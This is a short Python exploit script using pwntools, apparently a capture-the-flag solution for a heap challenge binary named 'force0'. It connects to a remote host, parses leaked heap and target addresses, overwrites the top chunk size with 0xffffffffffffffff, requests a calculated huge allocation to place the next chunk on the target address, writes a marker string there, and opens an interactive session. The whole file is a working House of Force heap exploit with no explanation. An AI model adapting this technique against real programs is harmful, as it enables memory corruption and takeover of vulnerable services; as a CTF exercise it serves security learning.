#!/usr/bin/env python3



from pwn import *


e = ELF("./force0")
#r = process("./force0")
r = remote("107.191.51.129",5002)
r.recvuntil(b"Heap address @")
heap_base = int(r.recvline().strip(),16)
print(hex(heap_base))
r.recvuntil(b"Target address @")
target = int(r.recvline().strip(),16)
print(hex(target))
r.sendlineafter(b">",b"1")
r.sendlineafter(b"Size:",b"24")
r.sendafter(b"Data:",b"A" * 24 + p64(0xffffffffffffffff))
target_size = 0xffffffffffffffff - (heap_base + 0x20) + (target -  0x20)
r.sendlineafter(b">",b"1")
r.sendlineafter(b"Size:",f"{target_size}")
r.sendafter(b"Data:",b"A" * 32)
r.sendlineafter(b">",b"1")
r.sendlineafter(b"Size:",b"24")
r.sendafter(b"Data:",b"I DID!\x00" + b"A" * 25)
r.interactive()

